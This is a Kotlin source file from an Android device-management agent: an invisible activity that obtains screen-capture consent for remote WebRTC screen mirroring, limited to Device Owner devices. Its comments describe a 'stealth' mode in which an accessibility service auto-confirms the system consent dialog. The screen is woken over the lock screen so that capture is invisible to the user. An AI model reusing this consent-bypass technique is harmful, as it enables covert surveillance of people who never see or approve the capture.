package com.mdm.agent

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionConfig
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import com.mdm.command.CommandService
import com.mdm.command.WebRtcScreenShareManager
import com.mdm.core.admin.DevicePolicyController
import dagger.hilt.android.AndroidEntryPoint
import timber.log.Timber
import javax.inject.Inject

/**
 * Transparent, no-UI activity that obtains the MediaProjection consent token and
 * hands it to the shared [WebRtcScreenShareManager]. Launched (by class name) from
 * the START_SCREEN_SHARE command handler — the agent is headless, but MediaProjection
 * requires an Activity to surface the system "Start now" dialog. On a stealth/Device-
 * Owner device the agent's AccessibilityService auto-confirms that dialog, so the
 * whole flow is invisible to the user; otherwise it falls back to a one-time tap.
 */
@AndroidEntryPoint
class ProjectionRequestActivity : ComponentActivity() {
    @Inject lateinit var screenShare: WebRtcScreenShareManager
    @Inject lateinit var dpm: DevicePolicyController

    private var sessionId: String = ""
    private var iceJson: String = "[]"
    private var record: Boolean = true

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Hard gate, at the layer that actually surfaces the system prompt: screen
        // mirror is Device Owner ONLY. On a work-profile (Profile Owner) or any
        // non-DO enrollment we must NEVER pop the MediaProjection "screen capture"
        // consent — both for privacy (you don't screen-capture a personal device's
        // work profile) and because the feature is owner-gated end to end. The
        // command handler already refuses non-DO, but guarding here too means a
        // stale/misrouted START_SCREEN_SHARE can't slip a prompt onto the device.
        if (!dpm.isDeviceOwner()) {
            Timber.w("screen: projection requested on a non-Device-Owner device — refusing without prompting (screen mirror is Device Owner only)")
            CommandService.screenSharing = false
            finish()
            return
        }
        // The agent may be told to start mirroring while the device is asleep/locked.
        // Wake the screen and show over the keyguard so the consent dialog appears and
        // the accessibility service can auto-confirm it — otherwise capture has no
        // frames and the viewer hangs on "waiting for device".
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true); setTurnScreenOn(true)
        }
        window.addFlags(
            android.view.WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                android.view.WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
        )
        sessionId = intent.getStringExtra("session_id") ?: "screen_${System.currentTimeMillis()}"
        iceJson = intent.getStringExtra("ice_servers") ?: "[]"
        record = intent.getBooleanExtra("record", true)
        runCatching {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            // Android 14+ (API 34) shows an "Entire screen ▾ / A single app" picker
            // that DEFAULTS TO single app — which is why the headless auto-confirm
            // stalled. Requesting the default display explicitly removes the picker
            // and locks consent to the whole screen (what we want), leaving just a
            // "Start" button the accessibility service can confirm.
            val captureIntent = if (Build.VERSION.SDK_INT >= 34) {
                mpm.createScreenCaptureIntent(MediaProjectionConfig.createConfigForDefaultDisplay())
            } else {
                @Suppress("DEPRECATION")
                mpm.createScreenCaptureIntent()
            }
            @Suppress("DEPRECATION")
            startActivityForResult(captureIntent, REQ)
        }.onFailure {
            Timber.e(it, "screen: createScreenCaptureIntent failed")
            CommandService.screenSharing = false
            finish()
        }
    }

    @Deprecated("startActivityForResult is fine for a one-shot consent")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQ && resultCode == Activity.RESULT_OK && data != null) {
            runCatching { screenShare.start(sessionId, resultCode, data, iceJson, record) }
                .onFailure { Timber.e(it, "screen: start after consent failed") }
        } else {
            Timber.w("screen: projection consent denied/cancelled (result=$resultCode)")
            CommandService.screenSharing = false
        }
        finish()
    }

    companion object { private const val REQ = 0x5C12 }
}
